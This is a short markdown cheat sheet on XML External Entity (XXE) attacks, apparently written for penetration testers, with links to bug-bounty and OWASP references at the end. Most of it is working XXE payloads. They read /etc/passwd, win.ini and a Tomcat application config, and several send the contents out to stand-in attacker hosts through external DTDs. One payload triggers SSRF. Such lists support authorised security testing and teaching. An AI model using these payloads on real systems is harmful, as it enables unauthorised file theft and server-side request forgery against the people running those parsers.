---
title: XXE
---

## Testing

Testing with python:

```
doc = etree.parse(open('/tmp/tmp.xml'), etree.XMLParser(resolve_entities=True,no_network=False))
```

## Payloads

Basic Local File Read

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

Exfiltrate data (e.g., blind)

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://exfilbox/?%xxe;">]><foo>&blind;</foo>
```

XXE + SSRF

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
```

XXE using External DTD

```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
%sp;
%param1;
%exfil;
]>
```

```
<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
```

External DTD handling tags:

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % start "<![CDATA[">
<!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml ">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://evil/evil.xml">
%dtd;
]>
<root>&all;</root>
```

```
    <!ENTITY all "%start;%stuff;%end;">
```

## Cheatsheets

* [Bugbounty XXE Cheatsheet](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md)
* [Specific Case Payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
* [OWASP XXE Prevention Cheatsheet](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)
* [OWASP XXE Testing Guide](https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008))
